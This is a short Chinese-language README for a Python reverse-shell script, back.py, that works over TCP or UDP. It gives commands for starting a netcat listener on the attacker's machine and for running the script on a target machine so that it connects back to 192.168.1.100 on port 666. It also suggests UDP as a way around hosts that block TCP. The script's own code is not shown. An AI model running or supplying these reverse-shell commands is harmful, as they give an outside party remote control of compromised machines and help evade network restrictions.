# python 版本的反弹shell 支持udp

用法 ：
	python back.py <back ip> <port> 

	example 1: 反弹shell到我的电脑：192.168.1.100  端口 666

	本地监听 ：nc -l -p 666 -vv
	目标机器执行：	python back.py 192.168.1.100 666

	example 2: 对于封了tcp的机器，可以用udp反弹（udp没有tcp稳定）
	
	
	本地监听 ：nc -l -p 666 -vv -u
	目标机器执行：	python back.py 192.168.1.100 666 udp

	
